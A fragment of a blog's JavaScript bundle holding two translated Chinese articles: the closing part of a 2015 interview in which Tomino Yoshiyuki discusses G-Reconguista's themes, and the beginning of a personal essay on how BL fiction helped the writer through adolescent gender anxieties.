這樣的創作方式，首先就是包含著希望在我們的下一代有了孩子之後，去找到解決辦法的心情。而在這樣的場合，我希望大家可以思考的，是處於能夠向公眾發表意見位置的人們，能夠對表現的自由有所自律。倒不如說，被人家說「像你這樣的人談論『自由』可真是令人困擾啊」還更加重要。對於人類來說最重要的事情，那就是展示出大義，可是當使用到「大義」這個詞的瞬間，錯誤就會產生。所以，當思考大義到底是什麼東西的時候，我閱讀了《20 年危機》，被直白地指出，人類原本就是一邊做著夢一邊自我毀滅的生物啊。第一次世界大戰到第二次世界大戰之間，是危機的時代。創立了國際聯盟的人們，與普通的世人，誰都不會去想要破壞掉這個世界，可是，世界卻變成了後來那個樣子。在處理現實問題的時候，因為不斷地處於後手，所以才會那樣再度引發戰爭。</p>\n<h2 id=\"為了讓-100-億人成為-nt\">為了讓 100 億人成為 NT</h2>\n<p>◇ 宇野：回到 G-RECO 的話題裡吧，我在想為什麼文明人會躲到金星裡面，看來就是因為在這樣的戰爭裡受苦了吧？</p>\n<p>◆ 富野：對。雖然在以前就有過這樣的想法，但讀了 E•H•卡爾的書後，我終於能夠用語言說出來了。所以，在證明我的直覺沒錯這一點上，我是很感激的。可是，那個還是最後再說吧。動畫這種程度的東西，是不需要信息的。首先，無論如何讓孩子們就算看不懂也要看下去。然後，在他們心中植入「這有些奇怪啊」的種子，那麼其解決方法或許就能在他們這一代，或者他們的下一代被找到。也就是說，因為我希望得到一個解決辦法，來應對在這兩三百年都無法突破的理想與現實之間的關係，而恐怕這不是一兩代人就能解決的問題吧。那麼，就沒必要傳遞我這種程度的信息了。人類以百年未單位都解決不了的問題，就靠我自己的思考是不可能解決的吧。而且，就算想去尋求答案，也一定無法對應現實的。世間一切都是以組織的集合體來存在，所以必須要改變組織全體，而對於加入到組織裡面的人們，用好懂的方法來說，就是必須要讓他們成為「New Type」。這樣的話，就必須考慮不是一兩百人，而是要讓 100 億人這樣的單位成為 NT。到那個時候，我一不小心成為新興宗教的教主也沒辦法吧。</p>\n<p>◇ 宇野：富野先生們的世代，花了數十年證明了，可以存在於迪士尼採用不同方法論製作的動畫。通過這些動畫，創造了我們的現在。那也是在這一領域的開拓者所被允許的特權吧。並不是才能如何的問題，而是創造了這個領域的人們所做的開拓。</p>\n<p>◆ 富野：實際上我那時候就是想要創作這樣的東西呢。畢竟當是我可不想白白死去啊。</p>\n<p>◇ 宇野：在那個時候，創作面向兒童的作品就是富野先生的突破口吧。</p>\n<p>◆ 富野：我對面向兒童這個說法產生了實感，幸好不用等我老了才能注意到這一點。和同世代的人談話，或者跟大人們談話，是很危險的事情，會讓我變成文化人。到了這個年齡被稱作文化人，比起被叫做巨大機器人作品的專家富野先生，來的要更加厲害的樣子啊（笑）。這種安心感，對於老人家來說是非常甜美的蜜糖。在我創作 G-RECO 的時候，逐漸感覺到這真是可怕啊。</p>\n<p>◇ 宇野：剛剛也提到了，我希望能夠看到富野由悠季通過創作電視動畫，或者兩小時電影的，作為作家而積累起來的一切的完成形的作品呢。</p>\n<p>◆ 富野：宇野先生你所說的完成形，是非常可怕的說法啊。只要是創作者，大家都會這麼想的，只要不是神來親自動手，那麼就絕對做不出那樣的東西。我很明白，只要想要製作完成形的那個瞬間，那麼就會需要非常厲害的力量和格式和靈感。比如說，達芬奇的蒙娜麗莎就是這樣，畫家本人肯定沒有想著要創作出能成為世界第一美術代名詞的作品吧。當我聽說，達芬奇只是把畫帶在身上一起旅行，一點一點地進行修改的時候，就想到，莫非他只是用畫一幅自己喜歡的女人的春畫？蒙娜麗莎的畫就是有著那樣的感覺，若不是這樣大概就畫不成那樣的吧。</p>\n<p>◇ 宇野：這個時候，在 G-RECO 裡，果然就會在意貝爾利呢。在我的見解裡，貝爾利在動機上是有空洞的，需要愛達去拉著他前進。愛達一直認為，有著不同角色的兩人，是作為姐弟的一對組合，但她一直到後半都有著猶豫不決的地方，這是個問題吧？</p>\n<p>◆ 富野：沒錯，關於愛達和貝爾利的表現方法中出錯的部分，用安田（朗）君的話來說，愛達要是不多哭一點那就會很困擾。他還說，要準確地表現出愛達一方面有著過高的自我意識，但對於不斷失敗的自己感到非常不像話，這樣才好。可以說正是如此。若不能成功塑造出本應展開故事性的兩位主角，那麼故事就無法成立，G-RECO 就做不出來了。歸結起來，就是作品必須重視故事性，所以 G-RECO 就沒法像《海賊王》那樣有吸引力。若是能夠成功傳遞出角色的體溫，那麼在一萬人裡面，大概就會有兩到三人能夠去思考 G-RECO 背景裡的東西了吧。</p>\n<p>◇ 宇野：是。</p>\n<p>◆ 富野：我希望就從他們那裡尋求解決方法。想要跨越百年地去思考。</p>\n<h2 id=\"機體並不是身體的延長，而應該當成組織\">機體並不是身體的延長，而應該當成組織</h2>\n<p>◇ 宇野：這次以安田先生為首的畫師陣容所提交的，帶有全員強烈個性的機設，居然能都弄到一個作品裡面呢。我還沒見過這樣強力的手段呢。</p>\n<p>◆ 富野：能這麼說真是太讓我高興了。畢竟那不是隨便就能完成的工作啊（笑）。</p>\n<p>◇ 宇野：Z 鋼彈的時候也已經常常被抱怨說 MS 的機設沒有統一感，而在 G-RECO 裡，乾脆冒出來讓我會想「這真的是同一個世界的東西嗎？」這種程度的機設。而我後來可以很自然地看待這些機設時，又讓我自己吃了一驚。</p>\n<p>◆ 富野：關於這個，就如之前所說的，單純是堅持著角色的情感而已。</p>\n<p>◇ 宇野：只要操縱著它們的人的感情沒有動搖，那麼人們就能夠將其作為同一個世界裡的東西而接受了吧。</p>\n<p>◆ 富野：對。可是，一開始時，就有那麼多的機體實在讓我生氣，也很難過。畢竟劇本裡沒有這樣寫。把這些機體全部扔到劇本裡面，還加入了為了換乘機體而準備的背景。在作品中，說著光子電池啊，光子能源什麼的，但不要把這些想像成多麼飛躍性的東西，只是想說現在這樣的消費社會是無法維持的而已。因為，利用作品，給現實提供方便，是這次 G-RECO 最重要的目標。所以有關宇宙電梯的內容，中央塔把皇冠艇做成列車什麼的，只是希望考慮交通工具的問題而已。要交通工具有意義，就需要在這裡和那裡有什麼東西被運輸，否則就毫無意義。也就是成本無法維持的問題。沿著中央塔上升到一半，就會有像是人造衛星一樣的東西在那裡，這對於宇宙電梯來說是絕對不可能的事情。可是有著宇宙世紀時代的技術，所以就成功做到了，而且若是月球可能存在資源，那麼現實的政治家就會很平常地談論其既得權，但若考慮其性價比，就會說「只能靠像是中央塔那樣的東西了」。中央塔這個名字，在 G-RECO 裡面，已經被認定是在地球上完全不從事任何生產活動的地方了。「Capital」，也就是說，若是在地球上消費資本就會很困擾。我既想談論資本或許會將地球污染到那個地步，而資本的出口也只有中央塔，所以就是中央塔了。</p>\n<p>◇ 宇野：您這麼說，那麼就是說這次會接受過去所捨棄的東西吧。既可以有捷特團（ジット団），有可以有芭拉拉那樣的角色。這次，讓這樣的角色活下來了，是出於什麼理由呢？</p>\n<p>◆ 富野：要說什麼理由都沒有，那就是說謊了，但是像現在這樣被問到的時候，就會想，「啊，一定在什麼地方有考慮過吧」。</p>\n<p>◇ 宇野：雖然在 G-RECO 的我也想過，在機設的層面上絕對無法共存的東西，卻在同一個世界裡存在。要說這是一種調和，是不是有點不對呢。</p>\n<p>◆ 富野：我可沒做什麼調和哦（笑）。</p>\n<p>◇ 宇野：保持著異物感而共存的這個感覺，讓人非常舒服呢。</p>\n<p>◆ 富野：我從宇野先生的話裡，感覺到這是單一民族的發言哦。</p>\n<p>◇ 宇野：可是，只要不管的話，動畫就會變成那樣子的吧。像是想要去相信單一民族這樣的神話，想要看到調和的人們，就去看動畫，這樣也很多。一般來說，一般描繪那樣的世界觀的，大多也會表現得更加調和吧。</p>\n<p>◆ 富野：完全就是這樣。這樣或許也會用有點讓人討厭的說法，想要和自己的自我同步的那種脾氣，我會想，難道不會有點狹隘嗎？日本人本來就是多民族，但在昭和的初期，就用「大和民族」這種說法去取得統一感。我就想，「這種偏頗的知識到底是什麼呢？」所以在我思考這些事情的時候，就想到，我絕對不會認可只是腦子有點靈光的知識分子。</p>\n<p>◇ 宇野：不去調和，這果然是需要勇氣的話呢。因為就是依靠調和，戰後的動畫才建立在大家都是一樣的這樣的幻想之上的。</p>\n<p>◆ 富野：像我這樣的立場，幹著我這樣的工作的話，就會在角色論裡把本能性的辛勞給表現出來了。也就是說，存在著過去的富野的故事構造，但那只是到那時為止的我的體驗所積累起來的東西。現在只要加入完全不同的要素，那麼就會變成不同的東西。所以對我來說，像是芭拉拉、奇卡拉、昆、奇亞，以及瑪妮這樣的角色，對於他們，我像是得到了一些對人的容忍量的感覺。憑藉單方面的喜惡來決定敵我，這樣的故事論是絕對不行的，而是對於出現的角色，有著強烈的想要培養他們的心情。這就是我最新得到的感覺。</p>\n<p>◇ 宇野：若是過去的富野作品，完成使命的角色大多就會死掉。可是，這次在故事上的使命完成了，也還存活下來的角色有很多。那就是與至今為止的作品的大不同。畢竟在現實的世界裡，完成使命的人們也不是說就會死掉呢。</p>\n<p>◆ 富野：就算是架空的故事，只要感覺在故事的世界裡實際存在了，那麼就不會因為創作者而有所動搖。那已經是本能性的事情了。像我這樣的人也有著一定的職業生涯積累了，所以才能做到這一點吧。</p>\n<p>◇ 宇野：聽您這麼說，就更加感覺唯獨貝爾利是被他在劇情中的使命所束縛了呢。</p>\n<p>◆ 富野：是的。所以我現在希望好好考慮一下，「貝爾利，你到底是什麼人呢？」這個問題。</p>\n<p>◇ 宇野：是非常質樸的問題呢。那麼，在知道愛達是姐姐之後，有想過讓貝爾利去戀愛嗎？</p>\n<p>◆ 富野：這個嘛，在劇情構成中沒空去搞啊。可是，舉個例子，我確實有意識到，諾蕾德到底要扮演什麼樣的角色呢。諾蕾德也是個相當活躍的角色，實在是太過於活潑了，我感覺根本追不上她。在這個意義上來說，她可以說是一個我喜歡的角色，塑造得很好，但在故事上卻感覺有點游離。</p>\n<p>◇ 宇野：在 TA 鋼彈裡，出現了羅蘭這樣的雖然是男性，但也可以成為女性的角色時，我就覺得，富野先生是不是已經沒興趣製作「作為少年的性衝動的機器人動畫」那樣的作品了。得到巨大的機器身體，就可以代替性別上的自我實現，現在已經不是會這麼認為的時代了吧</p>\n<p>◆ 富野：現在聽你這麼說我才注意到，大概我對機械的信仰感已經消失了吧。</p>\n<p>◇ 宇野：我現在是 36 歲，但還沒拿到駕駛執照。比我年輕的下一代有更多也是沒有駕駛執照的。我們對於機器的感覺已經有很大變化了，本來在看機器人動畫時所持有的「只要將自己的意志投入到機器裡，就能夠得到比現在強大得多的力量，就一定能做到什麼事情！」的這種心情，正在消失吧。</p>\n<p>◆ 富野：雖然我也有這麼想過，但把現在的問題中的機器，換成組織的話，那麼機器人一類的東西在影像作品中，也可以成為一種噱頭吧。（そうは思うけれども、今のマシンという問題を組織と置き代えてみると、ロボット的なものは映像作品のなかでギミックになりうるんじゃないのかな。）</p>\n<p>◇ 宇野：也就是說，富野先生認為，在本質上，機器不是身體的延長，而是組織吧。</p>\n<p>◆ 富野：啊。正因為可以這麼去思考，所以這不應該讓像我這樣的機器人作品的第一世代去思考去創作，而是希望能交給下一代的人。</p>\n<p>◇ 宇野：對於過去曾經製作過鋼普拉，而現在已經到 40 歲上下的鋼彈愛好者們，可以說，他們性慾的發洩口就是鋼普拉了。可能也正因為這樣，Z 鋼彈和逆襲的夏亞才有了那樣的展開，但在 TA 鋼彈的時候，心情已經發生了變化，已經不需要面對那樣的問題了。我很好奇，那時候是不是發生了什麼呢。</p>\n<p>◆ 富野：自己身上發生了什麼，我也不知道，當時也沒有發生過像是事件一般的東西吧。結果，最關鍵的，大概還是我對技術的態度變得極端的懷疑吧。也就是說，技術的發展會不會讓男子漢們失去工作呢。所以，此後可能會變成「大家都去當農民吧！」的情況，可是我自己完全沒有當農民的資質，肯定是當不成的。在這個意義上，我覺得雖然我自己不想變得唯心，但實際上還是變得唯心了。</p>\n<p>◇ 宇野：在《OVERMAN》裡，富野先生又一次對男孩子提起了興趣，但這與其說是少年的成長故事，倒不如說重點更多在於「逃出（Exodus）」運動，以及慶祝祭祀上吧。</p>\n<p>◆ 富野：所以，要這麼說的話，就會覺得，「果然上了年紀之後就是這個樣子了」。雖然很不甘心。但還是沒有辦法。</p>\n<p>◇ 宇野：如果是在過去，那宇宙居民肯定就會直接往地球上扔隕石了，但現在則是讓他們躲到金星裡面，說著「你們只要使用這種水平的技術就可以了」，慢慢地將技術傳送過去呢。</p>\n<p>◆ 富野：這麼說的話，G-RECO 可能就是一部極端閉塞的作品吧。可是，也包含這個意義，應該思考的最大主題就是這樣了，也只能將錯就錯了。很慚愧，G-RECO 就是這樣的作品吧。</p>\n<p>◇ 宇野：可是，富野先生在 G-RECO 裡留下的痕跡，我認為是非常重要的。鋼彈系列在此後肯定還會繼續製作下去，而創作了最初的鋼彈的富野由悠季，在 2010 年代又創作出了這樣的作品，那麼在今後肯定會在某處有所碰撞。到了那個時候，我覺得種下去的種子就會開花了吧。</p>\n<p>◆ 富野：雖然非常自負，但我也這麼想。可是，我不想讓人看到我上了年紀一飯三遺矢的醜態，所以我還想再考慮一下，應該要怎麼樣產生摩擦。</p>\n<p>◇ 宇野：前面也說過，大概有一半的意見果然還是沒必要去在意的。在我還是小學生的時候播放的 Z 鋼彈，也有很多說看不懂啊，為什麼要製作這麼不愉快的作品啊，之類的評價。</p>\n<p>◆ 富野：可是，如果說是正在生活的人們的現在進行時的故事，那麼小心翼翼，毫無自信地去做的話，感覺就會走向自我毀滅。應該要像現在所說的那樣有著蟲族心理準備，也應該多少有一些志氣。然後，暫時以工作的形式自己去做，也要想著要去獲得那樣的機會才行。</p>\n<h2 id=\"從-g-reco-開始的戰後動畫的再生\">從 G-RECO 開始的戰後動畫的再生</h2>\n<p>◇ 宇野：既然已經說是播種了，那麼在之後，無論網上怎麼評論，雜誌怎麼評論，都完全不用去在意，只要現在，富野監督在這裡所說的話，留存在這本書裡面，留給今後在有線電視裡，在衛星放送裡，或者在網絡配信上偶爾看到 G-RECO，而想著「這是什麼啊！」的人們的參考材料就好了。</p>\n<p>◆ 富野：可是，考慮到現在的動畫雜誌和媒體，或許我的話有點難聽，但我還是想說，上面的東西基本上都是胡說八道的，遲早要全部加以修正吧。</p>\n<p>◇ 宇野：要談論日本的出版業問題的話，那麼比起動畫，首先還是毫無疑問的紙質書本正在消失吧。雖然一直有人在說日本的動畫業界陷入了危機，可是在此之前，出版業肯定會先完蛋掉。</p>\n<p>◆ 富野：如果紙質書本消失了，我也會非常困擾啊（笑）。</p>\n<p>◇ 宇野：當然，為了還不習慣網絡的世代，紙質書本還是要保留下來的，但是再過半個世紀左右，大概人類就會對紙質書本說再見了吧。紙質書本會像以前的電燈泡那樣，成為古董吧。這不是誰對誰錯的問題，而是我們正身處這樣的時代。像是影像啊，音樂啊，文本啊，已經沒有人想要為情報本身而花錢了，也就沒辦法賦予它們價格。通過非常豪華的影像設備，比如說 iMax 影院這樣的「體驗」，固然可以賦予價格，但被消費的情報本身就沒有價格了。書雖然還可以被我們碰觸，但其所展示的內容已經不值錢了。</p>\n<p>◆ 富野：話題變得越來越灰暗了呢……可是，畢竟我們是沒辦法預測未來的，即便是像這樣滿是謊言的世界，也並不是不允許我們去尋求答案。G-RECO 的製作方法的基本，就在於此。</p>\n<p>◇ 宇野：G-RECO，對於被覆合電影院跟 YouTube 所調教過的人類而言，恐怕就像是恐怖分子一般的東西了吧，尤其是對於認為那些事情就是影像作品的人們來說……</p>\n<p>◆ 富野：啊，不，我還不認為有這麼厲害（笑）。可是，在我的世代，故意用機器人動畫這樣的體裁來創作，只是簡單地想著，不想輸給那樣的東西而已。雖然沒辦法用理想的方式表現出來，可是能夠以像 G-RECO 這樣的形式提出問題，好好地做好 26 話，就已經很不錯了。</p>\n<p>◇ 宇野：我已經感覺到，像是 G-RECO 這樣的作品的容身之所，在復合電影院跟 YouTube 都不存在，只能呆在被稱為斜陽的日本電視頻道的角落裡。所以，必須要從那裡開始反擊呢。</p>\n<p>◆ 富野：所以，我最希望身邊的人能夠明白，我不認為把鋼彈反覆炒冷飯是作為作家應有的行為。現在，並沒有認為自己能夠勝過好萊塢的日本人。既然不可能勝過好萊塢的，那麼就能看見「讓我做我喜歡的事情吧做到爽吧」這樣的心情。對於只能夠看到這樣子的日本人的臉，我感到不高興，但是，畢竟好萊塢式的全球推廣，果然還是在其背後運作的資本和製作的問題，這些與日本有著根本性的不同，所以就算我們跟他們正面叫板也是沒用的，而且還有著很多無法共存的領域。這和金融業很像，現在正在處理金融問題的人們，也都會承認，儘管他們所從事的工作根本不是經濟活動，但還是在做著買賣，這樣地獄一般的情況。沒錯，我們都已經明白了。那麼，問道為什麼不停止這一切呢的時候，就會得到這樣的回答，即便是集合了二三十人的天才，最根本的支撐也不是他們，而是「資本家」；但實際上是大眾在支撐著這一切。要停止這個連鎖，好好地提出命題並加以解決，那需要花上三百年的時間。而再考慮到隨之而來的思想文化運動的話，那就又要思考如何控制它們，那就必須創造出能夠控制這一切的時代，思考就推進到這非常根本的問題去了。剛剛也說過，發達國家的人們，全部都是做著夢的理想主義者，這樣一來對現實的對應就會處於 3、4 手的後手。這樣的話，話題就會變成今後兩三百年都還是很糟糕的世界了。可是，我絕對不會創作這樣子的故事。若是想把這些作為動畫的工作去完成，那就會非常困擾了。即便是成為天才，現在就達到耶穌基督一般的高度，也沒辦法一口氣解決這些問題吧。社會的運動就是這樣的東西，若是質量減輕了，運動就會停滯，那麼說實話，減少人口就是一件很好的事情，但唯獨日本人口減少也沒什麼意義吧。</p>\n<p>◇ 宇野：聽到富野先生您的話，我才意識到，富野先生對很多事情比我想像中還要更加絕望，所以才下定決心創作出 G-RECO 的呢。</p>\n<p>◆ 富野：只是因為胡思亂想的時間特別多吧。到了這個年紀，就能夠用那種方式去思考，而創作出 G-RECO，對我來說也有像是撿回一條命的意思在裡面。我大概還有三年啊，或者十年的命吧，雖然我也不想去想我還有二十年命這種事情，但能夠有機會好好地思考那些不得不去思考的事情，應該是很感激的。</p>\n<p>◇ 宇野：富野先生可是找到了無比強大的，花上一百年也不一定能擊敗的假想敵了呢。雖然還不知道要怎麼擊敗它，但光是看見了必須擊敗之物，或者必須跨越的壁壘，就已經有著完全不同的意義了。</p>\n<p>◆ 富野：自從我在去年知道了第二次世界大戰結束的時候的情況，我就對人類是多麼麻煩的東西有了更深的認識了。</p>\n<p>◇ 宇野：比如說，對於像克里姆•尼克這樣的，有著某種意義上非常可愛的小聰明的角色，我以為過去的富野先生是非常唾棄的。我感覺富野先生對於這種角色的距離感有了變化。</p>\n<p>◆ 富野：在距離感變化的同時，在此之上，我對於像克里姆這樣的人，會不會變得更加優秀呢，這樣的期待變得鮮明了起來。而且我也可以斷定，擁有自己的世界觀（イデオロギー）的人是可怕而偏激的，反而只能成為劇毒。雖然我不能說出他們的名字，但大家所知道的政治家們，都是極端守舊的類型，全是一些老派的人們吧？完全看不見這個世界的不幸的人們，是比死宅還糟糕的。我希望能編織出即便是這樣的人也能夠理解的話語。於是，動畫就是要達成這個目標相當方便的媒體。雖然我是希望讓 10 歲的孩子們也能看懂，但要這麼想，最重要的果然還必須是有趣的故事。</p>\n<p>◇ 宇野：所以您就回來了是吧。</p>\n<p>◆ 富野：啊。在這個意義上，故事真是很偉大呢。我在兩年前左右，才終於把林望所超譯（譯註：理解成白話文版就好）的《源氏物語》給全部看完了。然後，就覺得《源氏物語》真是最糟的故事了（笑）。一點都不有趣。雖然我有著《源氏物語》是古典文學中優秀作品的印象，但真的是最糟了（笑）。但雖然是最糟的，但還是想好好看一遍，哪怕是超譯的。因為它讓我明白了，人原來是這樣的，人的感情是難以控制的最糟的。那麼，為什麼我現在要談論《源氏物語》呢，因為這與情感的話題有關。G-RECO 是如此亂糟糟的，塞進去了各種各樣設定的作品，如果說為什麼能夠完成呢，那就跟《源氏物語》所做的事情是一樣的。只要人的感情能夠一以貫之，無論怎麼幹都沒問題，這或許就是我從《源氏物語》所學到的東西。我也想過，對於故事來說，起承轉合啊，大團圓啊，這些都是必須的。可是，似乎並非如此。故事大概應該是無所不能的。（譯註：這裡老賊一共用了四個最低，其中至少三個是直接形容《源氏物語》的。）</p>\n<p>◇ 宇野：戰後動畫現在似乎正處於，像是宮崎駿那樣講述過去，總結「自我史」而結束了，又或者是押井守和庵野秀明那樣無法創作都死胡同裡呢。</p>\n<p>◆ 富野：當我思考要如何擺脫這一困境的時候，得到的答案是不去講述過去的故事。就算找不到解決方法，但逃避現實還是不行的。正因為這樣，往無數的謊言中，投入現實主義，那就是從 G-RECO 開始的……</p>\n<p>◇ 宇野：戰後動畫的再生，對吧？</p>\n<p>◆ 富野：那正是像我這樣的不懂得學習的人們的志氣。學識並非全部。所以在我心中明確了，要超越哲學這樣的命題（大笑）。</p>\n<p>◇ 宇野：我在看《起風了》、《輝夜姬的故事》時，也有著，戰後動畫就是由這些人創作的，而在解決了這些人所抱持著的實際存在的東西之後，就會一起完結啊，這樣的想法。</p>\n<p>◆ 富野：可是，我不能就這樣讓它們結束。首先，很簡單，存在著面向公眾非常嚴肅的媒體。在那裡，像我這樣的個人是沒必要出現的，要是會登載什麼故事的話，雖然很不甘心，但大概就會使《源氏物語》吧（笑）。我還有一本書想要介紹，那就是樋口清之先生的《梅干與日本刀》。我是日本文化所培育起來的，而這還是第一次遇到把日本文化最根本的構造如此鮮明地描寫出來的書。用不太恰當的比喻，瓦屋頂是很重的嘛。那麼，你知道明明房子是用木柱，但還要裝上瓦片來應對地震的理由是什麼嗎？那些瓦屋頂，不像現在的木工那樣，沒有用釘子釘住。所以那樣的構造，當搖動的時候，瓦片就會飛掉，只剩下柱子了。還有一個，和服有著三個變遷時期，在古墳時代的服裝是褲子，然後日本人就放棄了褲子，換成了和服（著物）的形式。畢竟，穿著褲子的話就沒辦法踏進水田了。所以就換成了可以捲起來的構造。從古墳時代到彌生時代，水田這種種植方式被固定下來。而到平安時代，又有一次大的變遷，和服（著物）終於有了袂。當我知道了這些之後，就明白了，和服（著物）就像征著日本人的變遷，也存在於這些變遷之中。對我來說這可是很有衝擊性的。而因為能夠造出水田，日本人測量水平面的能力就變得非常的高。要造出水田，就要對地面進行測量整理，所以在日本很發達的和算，發展得與西洋的數學有著同等程度，甚至以上地好。伊能忠敏能夠製作出日本地圖，也是因為有著這樣的技術，書上是這麼告訴我的。從這樣的事物裡得到的知識，與 G-RECO 裡描寫的進食和排泄，乃至性的問題，全都有所關聯。雖然我也希望大家都能讀一下這些書，但我不會對你們說，去讀吧，而是希望只要看看我的作品就能懂了。</p>\n<p>◇ 宇野：我已經能夠看到應該獲得的現實性了。然後就是堅持這一點的故事了。我會好好期待富野先生下一個故事的。</p>\n<p>◆ 富野：像我這樣的人，也有必要展示出我從人生中學到的東西吧。我不會輕易說出遺作這樣的話的。在這個意義上，我還想要繼續堅強地活下去啊（笑）。</p>\n<p>2015 年 5 月 13 日 在日昇公司</p>\n<p>訪談出自：Gundam Reconguista in G Official Guidebook 富野由悠季 動畫監督。從日本電視動畫的黎明期開始，以大量的作品，作為演出家、腳本家、作詞家、小說家等身份活躍。代表作是由《機動戰士鋼彈》開始的鋼彈系列，《Brain Powered》，《OVERMAN》等。</p>\n<p>宇野常寬 評論家。批評雜誌《P-L-A-NETS》總編輯。以文學、亞文化為中心進行著各種各樣的評論活動。主要的著作有《ゼロ年代の想像力》（早川書房）、《リトル•ピープルの時代》（幻冬舍）、《日本文化の論點》（築摩書房）等。</p>\n","date":"2019-10-29T06:00:00.000Z","excerpt":"","printDate":"October 29, 2019","printReadingTime":"3 min read"};

var route_27 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod28
});

var Mod29 = {"title":"【譯】論擁有拯救人生某段時期可能性的性幻想","slug":"ACG-sexual-illusion","html":"<p>原文連結：<a target=\"_blank\" rel=\"nofollow\" href=\"http://togetter.com/li/22217\">論擁有拯救人生某段時期的可能性的性幻想</a> (已失效)</p>\n<p>我想總結一下曾經（在個人觀點上）肩負起我人生某段時期的 801。</p>\n<p>由於是我自己的故事，因此這並不是「所有喜歡 801 的人都是如此」的考察。</p>\n<p>雖然やおいちゃん和コンビニ店長都已經寫過類似的東西了，エロ物也好什麼也好、能夠將人從閉塞感和咬牙切齒的苦楚中拯救出來的故事是確實存在的。即使那是逃避、白日夢，能夠治療自己的心、並且有所共感，這件事本身就是份救贖、並且能夠讓我感受到世界的寬廣。</p>\n<p>尤其是 10 歲~19 歲這段時間對性方面相關的部份和戀愛方面所感受到的閉塞感，對自己的性感到厭惡等等而經常感到無法確實的整理，這時的エロゲ、BL 這一類的性幻想已不只是單純的性慾處理而已、我們在裡面尋找「真實」和「救贖」。即使知道這些東西都是 18 禁。</p>\n<p>當感受到「我們只能以『女性』之身和異性求歡、自己的性是如此的骯髒」的時候，BL，尤其是二次創作的，『從戰鬥或是運動之中產生的強力的信賴關係，由這種關係所連結的「對等的」人際關係在戀愛的層面上也能夠緊密結合』『和是男是女無關，我就是喜歡你』，我也有過認為這一類的幻想是救贖的日子。</p>\n<p>況且作為一個女人的愛情要思考的東西實在是太多了（懷孕或是生小孩有年齡限制、到幾歲就要結婚、能不能兼顧工作、對方的婆婆如何之類的），實在不想去思考這種繁雜細微的事情。也可以說只想寄身於雙方擦出火花這種抽像的戀愛幻想裡。</p>\n<p>而男性的情況，在性方面的需求＝被愛著，這樣的關係式某部份上來說是相通的，所以相當多的故事是「會無條件的愛著自己的女孩子」。而女性對於在性方面被要求這件事是如同「販賣」一般簡單的事，該說是會對於通常的戀愛湧起疑念，應該說是和自己的性切割後空想的故事才是真正的愛，這種感覺吧。</p>\n<p>以女性為題材的戀愛故事通常過於缺乏柔軟性，並且會讓人聯想到現實反而增加精神壓力，但 BL 是作為廣泛思考「戀愛」用的「砂地」，有著一切的可能性都能夠化為假想的情境的趣味性。像是，非常粗壯的男人卻是個受之類的，有著在性愛的立場上也能互相對換的對等的關係性。</p>\n<p>雖然１８禁系之中也有確實只為了性処理目的而存在的作品、對於自己本身的性感到煩躁時（並不是只在這種情況下，不過這種精神状態也是 case 之一）而尋求能夠成為救贖的故事的人若是存在的話，那麼能不能夠不是只一味的定下限制，而能夠留下選擇歧呢?</p>\n<p>女人是要，作為工作者活下去呢，或是要朝向専業主婦發展呢，和很多人交往是好事嗎？這樣和妓女沒兩樣所以是壞事嗎？孩子呢？生活方式呢？像這樣藉由自己的姿態人生和男人的挑選方式都會改變。為了決定這些事情，必須要作出一個判断的基準。而這是教育不會教給我們的事情。</p>\n<p>在思春期時、在這個，父母也不會告訴你該如何活下去決定自己的姿態時，想到未來就會絕望的時候、即使是幻想也好，能夠讓我見到恋愛裡多様的可能性的作品是極上的救贖。即使知道這只是幻想。即使這會構成夢和現實的判斷。</p>\n<p>在女人生存方式變得多樣化的現在，自己的未來和與之伴隨著的戀愛的價值觀要如何制定才好，能夠成為路標的事物也相當的少。女人應該要保護家庭、應該要勞動、孩子要愛到三歲、等等各式各樣麻煩的姿態交錯混雜之中，什麼東西能夠成為這份路標、成為救贖，並給與我指示呢。</p>\n<p>並不是說只有還沒決定自己人生姿態的人 BL 才會在身上發動機能，我認為比較像是作為一部份的工作機制在輔導著自己的這一部份。不是只有單純的生鮮感而已，也有純淨的戀愛的良性部份，不過將什麼作為良性部份來攝取的倒是因人而異。</p>\n<p>我再次思考了關於 BL 的部份。也許純粋地和女性的生存方式來連接是錯誤的。或者更應該說「名為女性的性別」在自我之中要如何做個決斷吧。</p>\n<p>我在小時候就隱約注意到、單就「女人這個性別」，幾乎等同於全身凶器的武器。女生自從生下來就持有名為女性的銳利武器。這效果是強烈無比。雖然基本上是不知道使用方式，有時，會有強力的使用所謂女人的武器的人，也就是所謂的假面女人（指在男人前面裝傻、裝笨、裝可愛來撒嬌的女人）。</p>\n<p>而，實際目擊到同年級的男生和大叔是如何簡單地被欺騙時，我深深的覺得「真是討厭哪」。但另一方面，卻注意到自己也在無意識之下依賴著這份武器，這非常的恐怖。我察覺到名為女人的性別是無法被捨棄的、一輩子都會跟在身上的。</p>\n<p>小學生的時候還好，升上中學、進入思春期之後，戀愛和性欲等等複雜細微的問題就會開始出現。這時、這份「女性」的武器的使用方使要如何使用的問題是最直接的刺中我。</p>\n<p>然我也想被男生喜歡，想要被認為我是必要的，只是只因為身為「女性」就被人所追求，我不喜歡這樣、我不要這種武器，我是這麼想的。所以在旁邊側目那些將自己的可愛直率的發揮到最大的女孩子們，即使羨慕卻又覺得厭惡。會覺得想要捨棄掉性、能夠和身體毫無關係地擦起火花就好了。</p>\n<p>對於「一輩子都會跟隨自己名為女人的性」的閉塞感和、在自己的深處裡無法處理的鬱悶，想著「如果年輕就該怎樣的」而發揮自己的潔癖症的女人是多麼的骯髒，身邊在談戀愛的人們那種你儂我儂的樣子真是糟透了！像是湧出這種情緒的時候，做為某種救贖，BL 或是 801 的故事就變得相當美麗了。</p>\n<p>而這在前面也寫過這種關係性，也是一種的幻想，會非常強烈的被它所吸引。</p>\n<p>我對於商業誌的 BL 毫無興趣，可說是獨鐘二創。這是因為有著原作的角色之間的「穩確的信賴關係和羈絆」作為前提後，在這之中「戀愛關係也是互相成立的」這種能夠在男女之間是相當少數這種題材的故事裡成為一份救贖。若一開始就是以 BL 前提直接開始談戀愛的故事我是沒什麼興趣的。</p>\n<p>在思春期裡最煩惱的時期裡，將這一類的故事做為救贖而消費的這段時間裡，我也逐漸成長，將未來的事放入視野裡，我想我逐漸開始能對自己的性能夠做出整合與切割。現在並不會對自己身為女性感到厭惡，到了某個程度的年齡也會理解到男性也不是如此單純的，也可以說是冷靜下來了吧。</p>\n<p>雖然這說到底也只是我個人的事情，並不是所有喜歡 BL 的人都是如此，但確實對我來說，BL 是直到自己的姿態固定前必要的東西。並不是說讓 18 